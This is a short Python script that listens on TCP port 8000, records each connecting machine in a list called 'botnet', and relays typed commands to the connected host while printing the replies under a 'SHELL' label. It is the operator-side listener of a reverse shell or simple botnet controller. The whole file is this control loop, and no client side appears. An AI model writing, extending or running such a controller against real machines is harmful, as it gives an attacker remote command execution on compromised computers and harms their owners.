from socket import *

botnet = []

def setup():
    server_port = 8000
    accept_socket = socket(AF_INET, SOCK_STREAM)

    accept_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    accept_socket.bind(("0.0.0.0", server_port))
    accept_socket.listen(1)

    client_socket, addr = accept_socket.accept()

    botnet.append(addr)
    print("SHELL: " + client_socket.recv(4068).decode())

    return client_socket

def command_runner(socket):
    command = ""
    while command != "exit":
        command = input("command: ")

        if (command == "show"):
            for bot in botnet:
                print("bot ip: " + bot[0])
            continue
            

        socket.send(command.encode())

        print("SHELL: " + socket.recv(4068).decode())

command_runner(setup())